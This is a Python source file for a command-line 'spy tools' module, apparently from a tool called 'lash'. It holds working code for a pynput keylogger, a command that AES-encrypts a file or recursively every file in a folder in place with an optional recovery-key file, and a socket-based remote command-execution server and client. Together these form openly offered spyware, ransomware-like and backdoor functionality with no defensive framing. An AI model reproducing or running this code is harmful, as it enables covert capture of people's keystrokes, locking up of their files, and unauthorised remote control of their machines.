import os
import click
import socket
import pyaes as pya
from threading import Thread
from pynput.keyboard import Listener
from lash.Exportables.spyTools import *
from rich import print


@click.group('spy', help='Spy tools')
def spy():
    ...


@spy.command(help='Keylogger')
@click.option('-p', type=click.Path(exists=True), default='.', help='Path to send output file with info')
def keyboard(p):
    print('<running> f3 to stop')
    os.chdir(p)
    listener = Listener(on_press=key_down, on_release=key_up)
    listener.start()
    listener.join()
    print(f'> Process Finished <')


@spy.command()
@click.argument('p', metavar='path', type=click.Path(exists=True), required=False, default='.')
@click.argument('key', metavar='<key>', type=click.STRING)
@click.option('-dc', is_flag=True, default=False, help='Decrypt file')
@click.option('-ex', is_flag=True, default=False, help='Export key to text file')
@click.option('-cl', is_flag=True, default=False, help='Crypt all files in a folder')
@click.option('-v', is_flag=True, default=False, help='Verbose mode')
def crypt(p, key, dc, ex, cl, v):
    """\b
    Encrypt/Decrypt files with AES algorithm

    \b
    Save the <key> you need her to decode
    The key NEED have 16 characters (128bits)
    \b
    Ex: crypt -ex ...\text.txt $kvzis1@7y602qsx
    """
    bkey = str.encode(key)  # Convert to bytes
    if p.find('\\') == -1 or p.find('/') == -1:
        fp = os.path.join('.', p)
    else:
        fp = p
    if dc:
        file = open(fp, 'rb')
        crip = pya.AESModeOfOperationCTR(bkey)
        data = crip.decrypt(file.read())
        crypted = open(fp, 'wb')
        crypted.write(data)
        print(f'\nFile decrypted successfully') if v else None
    else:
        if cl:
            try:
                os.chdir(fp)
            except:
                print(f'\nError the path {fp} is not valid!')
                return
            for root, folder, files in os.walk('.'):
                for file in files:
                    file_value = open(os.path.join(root, file), 'rb')
                    crip = pya.AESModeOfOperationCTR(bkey)
                    data = crip.encrypt(file_value.read())
                    file_value.close()
                    crypted = open(os.path.join(root, file), 'wb')
                    crypted.write(data)
        else:
            file = open(fp, 'rb')
            crip = pya.AESModeOfOperationCTR(bkey)
            data = crip.encrypt(file.read())
            file.close()
            crypted = open(fp, 'wb')
            crypted.write(data)
        if ex:
            if os.name == 'nt':
                if not cl:
                    os.chdir(fp[:fp.rfind('\\')])
                else:
                    pass
            else:
                if not cl:
                    os.chdir(fp[:fp.rfind('\\')])
                pass
            open('recovery-key.txt', 'w').write(key)
        print('\nFile(s) encrypted') if v else None


@spy.command(help='Remote commands injection host/client')
@click.option('-h', '-host', type=click.STRING, help='Host this machine for remote access, pass the port Ex: -h 8080')
@click.option('-c', '-connect', type=click.STRING, nargs=2, help='Connect to a host by it\' IP, port. Ex: -c 192.168.1.1 8080')
@click.option('-v', is_flag=True, default=False, help='on/off verbose mode for server')
def injection(h, c, v):
    buffer = 1024 ** 2
    if h:
        host = socket.gethostbyname(socket.gethostname())
        port = port_verify(h)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((host, port))
            print(f'Server online [ host: {host}, port: {port} ] Waiting a connection...') if v else None
            while True:
                s.listen()
                conn, addr = s.accept()
                print(f'{addr} connected') if v else None
                Thread(target=handle_connection, args=(conn, buffer,)).start()
    elif c:
        host, port = c
        port = port_verify(port)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host, port))
            print()
            print(injection_client_msg())
            print()
            while True:
                try:
                    path = s.recv(buffer).decode('utf-8')
                except:
                    path = 'undefined'
                    pass
                command = str(input(f'{host}\\{path}> ')).strip()
                if command == '':
                    command = 'snake'
                try:
                    command_arg1 = command.strip().split()[0]
                except IndexError:
                    command_arg1 = command
                if not custom_client_manager(s, buffer, os.getcwd(), command, command_arg1):
                    s.sendall(bytes(command, 'utf-8'))
                    print(s.recv(buffer).decode('utf-8'))
    else:
        print('[red]Error: No option passed[/red]')
